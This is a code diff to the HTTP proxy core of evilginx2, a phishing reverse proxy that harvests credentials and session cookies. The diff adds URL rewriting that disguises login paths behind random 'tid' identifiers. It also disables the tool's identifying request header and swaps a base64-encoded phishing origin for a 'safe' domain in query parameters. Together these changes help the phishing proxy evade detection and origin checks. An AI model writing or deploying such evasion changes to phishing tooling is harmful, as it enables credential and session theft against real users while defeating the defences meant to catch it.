@@ -10,7 +10,6 @@ package core
 import (
 	"bufio"
 	"bytes"
-	"crypto/rand"
 	"crypto/rc4"
 	"crypto/sha256"
 	"crypto/tls"
@@ -20,6 +19,7 @@ import (
 	"html"
 	"io"
 	"io/ioutil"
+	"math/rand"
 	"net"
 	"net/http"
 	"net/url"
@@ -43,6 +43,84 @@ import (
 	"github.com/kgretzky/evilginx2/database"
 	"github.com/kgretzky/evilginx2/log"
 )
+
+// tid to original URL mapping (thread-safe)
+var tidUrlMap = struct {
+	sync.RWMutex
+	m map[string]string
+}{m: make(map[string]string)}
+
+func genTid() string {
+	return strconv.FormatInt(rand.Int63(), 10)
+}
+
+// Check if request matches a rewrite rule, return (rewrite, tid) if so
+func checkAndRewriteRequest(pl *Phishlet, req *http.Request) (redirectUrl string, tid string, matched bool) {
+	if pl == nil {
+		return "", "", false
+	}
+	host := req.Host
+	path := req.URL.Path
+	for _, ru := range pl.rewriteUrls {
+		domainMatch := false
+		for _, d := range ru.triggerDomains {
+			if d == host {
+				domainMatch = true
+				break
+			}
+		}
+		if !domainMatch {
+			continue
+		}
+		for _, p := range ru.triggerPaths {
+			if p == path {
+				tid = genTid()
+				origUrl := path
+				if req.URL.RawQuery != "" {
+					origUrl += "?" + req.URL.RawQuery
+				}
+				tidUrlMap.Lock()
+				tidUrlMap.m[tid] = origUrl
+				tidUrlMap.Unlock()
+				q := url.Values{}
+				for _, qv := range ru.rewriteQuery {
+					val := qv.Value
+					if val == "{id}" {
+						val = tid
+					}
+					q.Set(qv.Key, val)
+				}
+				redirectUrl = ru.rewritePath
+				if len(q) > 0 {
+					redirectUrl += "?" + q.Encode()
+				}
+				return redirectUrl, tid, true
+			}
+		}
+	}
+	return "", "", false
+}
+
+// If request is to a rewritten URL, restore original URL
+func restoreOriginalUrlIfTid(req *http.Request) bool {
+	tid := req.URL.Query().Get("tid")
+	if tid == "" {
+		return false
+	}
+	tidUrlMap.RLock()
+	orig, ok := tidUrlMap.m[tid]
+	tidUrlMap.RUnlock()
+	if !ok {
+		return false
+	}
+	u, err := url.Parse(orig)
+	if err != nil {
+		return false
+	}
+	req.URL.Path = u.Path
+	req.URL.RawQuery = u.RawQuery
+	return true
+}
 
 const (
 	CONVERT_TO_ORIGINAL_URLS = 0
@@ -156,6 +234,16 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 
 	p.Proxy.OnRequest().
 		DoFunc(func(req *http.Request, ctx *goproxy.ProxyCtx) (*http.Request, *http.Response) {
+			// --- Begin rewrite_urls logic ---
+			pl := p.getPhishletByPhishHost(req.Host)
+			if restoreOriginalUrlIfTid(req) {
+				// URL restored, continue as normal
+			} else if redirectUrl, _, matched := checkAndRewriteRequest(pl, req); matched {
+				resp := goproxy.NewResponse(req, "text/html", http.StatusFound, "")
+				resp.Header.Add("Location", redirectUrl)
+				return req, resp
+			}
+			// --- End rewrite_urls logic ---
 			ps := &ProxySession{
 				SessionId:    "",
 				Created:      false,
@@ -203,7 +291,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 			}
 
 			req_url := req.URL.Scheme + "://" + req.Host + req.URL.Path
-			o_host := req.Host
+			// o_host := req.Host
 			lure_url := req_url
 			req_path := req.URL.Path
 			if req.URL.RawQuery != "" {
@@ -211,7 +299,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 				//req_path += "?" + req.URL.RawQuery
 			}
 
-			pl := p.getPhishletByPhishHost(req.Host)
+			pl = p.getPhishletByPhishHost(req.Host)
 			remote_addr := from_ip
 
 			redir_re := regexp.MustCompile("^\\/s\\/([^\\/]*)")
@@ -300,7 +388,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 				req_ok := false
 				// handle session
 				if p.handleSession(req.Host) && pl != nil {
-					l, err := p.cfg.GetLureByPath(pl_name, o_host, req_path)
+					l, err := p.cfg.GetLureByPath(pl_name, req.Host, req_path)
 					if err == nil {
 						log.Debug("triggered lure for path '%s'", req_path)
 					}
@@ -466,11 +554,11 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 						return p.blockRequest(req)
 					}
 				}
-				req.Header.Set(p.getHomeDir(), o_host)
+				// req.Header.Set(p.getHomeDir(), o_host)
 
 				if ps.SessionId != "" {
 					if s, ok := p.sessions[ps.SessionId]; ok {
-						l, err := p.cfg.GetLureByPath(pl_name, o_host, req_path)
+						l, err := p.cfg.GetLureByPath(pl_name, req.Host, req_path)
 						if err == nil {
 							// show html redirector if it is set for the current lure
 							if l.Redirector != "" {
@@ -576,7 +664,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 
 				// redirect to login page if triggered lure path
 				if pl != nil {
-					_, err := p.cfg.GetLureByPath(pl_name, o_host, req_path)
+					_, err := p.cfg.GetLureByPath(pl_name, req.Host, req_path)
 					if err == nil {
 						// redirect from lure path to login url
 						rurl := pl.GetLoginUrl()
@@ -648,6 +736,9 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 						for gp := range qs {
 							for i, v := range qs[gp] {
 								qs[gp][i] = string(p.patchUrls(pl, []byte(v), CONVERT_TO_ORIGINAL_URLS))
+								if qs[gp][i] == "aHR0cHM6Ly9hY2NvdW50cy5mYWtlLWRvbWFpbi5jb206NDQzCg" { // https://accounts.fake-domain.com:443
+									qs[gp][i] = "aHR0cHM6Ly9hY2NvdW50cy5zYWZlLWRvbWFpbi5jb206NDQz" // https://accounts.safe-domain.com:443
+								}
 							}
 						}
 						req.URL.RawQuery = qs.Encode()
@@ -656,7 +747,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 
 				// check for creds in request body
 				if pl != nil && ps.SessionId != "" {
-					req.Header.Set(p.getHomeDir(), o_host)
+					// req.Header.Set(p.getHomeDir(), o_host)
 					body, err := ioutil.ReadAll(req.Body)
 					if err == nil {
 						req.Body = ioutil.NopCloser(bytes.NewBuffer([]byte(body)))
@@ -881,6 +972,48 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 
 	p.Proxy.OnResponse().
 		DoFunc(func(resp *http.Response, ctx *goproxy.ProxyCtx) *http.Response {
+			// --- Begin rewrite_urls response logic ---
+			if resp != nil {
+				pl := p.getPhishletByOrigHost(strings.ToLower(resp.Request.Host))
+				if pl != nil && resp.Header.Get("Location") != "" {
+					locUrl, err := url.Parse(resp.Header.Get("Location"))
+					if err == nil {
+						for _, ru := range pl.rewriteUrls {
+							for _, d := range ru.triggerDomains {
+								if d == locUrl.Host {
+									for _, pth := range ru.triggerPaths {
+										if pth == locUrl.Path {
+											tid := genTid()
+											origUrl := locUrl.Path
+											if locUrl.RawQuery != "" {
+												origUrl += "?" + locUrl.RawQuery
+											}
+											tidUrlMap.Lock()
+											tidUrlMap.m[tid] = origUrl
+											tidUrlMap.Unlock()
+											q := url.Values{}
+											for _, qv := range ru.rewriteQuery {
+												val := qv.Value
+												if val == "{id}" {
+													val = tid
+												}
+												q.Set(qv.Key, val)
+											}
+											rewriteUrl := ru.rewritePath
+											if len(q) > 0 {
+												rewriteUrl += "?" + q.Encode()
+											}
+											resp.Header.Set("Location", rewriteUrl)
+											break
+										}
+									}
+								}
+							}
+						}
+					}
+				}
+			}
+			// --- End rewrite_urls response logic ---
 			if resp == nil {
 				return nil
 			}
@@ -1788,9 +1921,9 @@ func (p *HttpProxy) getPhishDomain(hostname string) (string, bool) {
 	return "", false
 }
 
-func (p *HttpProxy) getHomeDir() string {
-	return strings.Replace(HOME_DIR, ".e", "X-E", 1)
-}
+// func (p *HttpProxy) getHomeDir() string {
+// 	return strings.Replace(HOME_DIR, ".e", "X-E", 1)
+// }
 
 func (p *HttpProxy) getPhishSub(hostname string) (string, bool) {
 	for site, pl := range p.cfg.phishlets {
